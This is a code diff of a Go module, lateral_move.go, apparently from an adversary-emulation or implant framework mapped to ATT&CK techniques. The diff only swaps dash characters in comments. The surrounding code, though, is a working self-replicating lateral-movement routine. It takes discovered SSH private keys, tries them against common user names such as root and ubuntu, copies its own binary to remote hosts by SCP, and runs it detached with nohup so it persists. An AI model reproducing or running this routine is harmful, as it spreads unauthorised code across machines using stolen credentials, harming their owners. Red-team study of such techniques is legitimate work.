@@ -1,13 +1,13 @@
 package ttp
 
-// lateral_move.go — TTP 22: SSH lateral movement via self-replication
+// lateral_move.go   TTP 22: SSH lateral movement via self-replication
 //
 // ATT&CK: T1021.004 (Remote Services: SSH) + T1570 (Lateral Tool Transfer)
 //
 // Technique:
 //   1. Read /proc/self/exe to get current agent binary (self-replication)
 //   2. SCP binary to remote host via discovered SSH private keys
-//   3. SSH exec: chmod + nohup (detached from session — survives logout)
+//   3. SSH exec: chmod + nohup (detached from session   survives logout)
 //
 // Tries all discovered SSH keys against users: root, ubuntu, ec2-user, admin.
 // Stops at first successful execution.
@@ -41,7 +41,7 @@ func LateralMove(params string) (string, error) {
 		keyPaths = discoverSSHPrivKeys()
 	}
 	if len(keyPaths) == 0 {
-		return "", fmt.Errorf("no SSH keys found — run TTP 21 first or specify a key path")
+		return "", fmt.Errorf("no SSH keys found   run TTP 21 first or specify a key path")
 	}
 
 	// Get current binary path via /proc/self/exe
@@ -72,14 +72,14 @@ func LateralMove(params string) (string, error) {
 				continue
 			}
 
-			// Step 2: SSH exec — chmod + nohup + detach
+			// Step 2: SSH exec   chmod + nohup + detach
 			execCmd := fmt.Sprintf("chmod +x %s && nohup %s > /dev/null 2>&1 &",
 				remotePath, remotePath)
 			sshArgs := []string{"-i", keyPath}
 			sshArgs = append(sshArgs, sshOpts...)
 			sshArgs = append(sshArgs, remote, execCmd)
 			if err := exec.Command("ssh", sshArgs...).Run(); err != nil {
-				// SCP succeeded but exec failed — report partial success
+				// SCP succeeded but exec failed   report partial success
 				return fmt.Sprintf("lateral: SCP to %s succeeded, exec failed: %v",
 					remote, err), nil
 			}
